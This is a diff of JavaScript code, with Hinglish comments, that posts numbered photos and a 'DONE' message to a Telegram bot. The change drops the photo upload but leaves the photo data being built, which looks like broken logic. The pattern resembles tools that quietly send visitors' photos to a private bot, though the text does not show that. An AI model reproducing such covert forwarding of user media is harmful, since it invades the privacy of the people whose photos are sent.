@@ -154,10 +154,19 @@
             // Photo ke niche chota sa reference (Optional)
             formData.append('caption', `Photo ${i+1} - ID: ${callId}`);
 
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
+            const dividerText = `<b>━━━━━━━━━━━━━━━</b>\n` + 
+                            `✅ <b>DONE:</b> ${callId}\n` + 
+                            `<b>━━━━━━━━━━━━━━━</b>`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: dividerText,
+                parse_mode: 'HTML'
+            })
+        });
         }
 
         alert("Success! Pehle Text gaya phir saari Photos.");
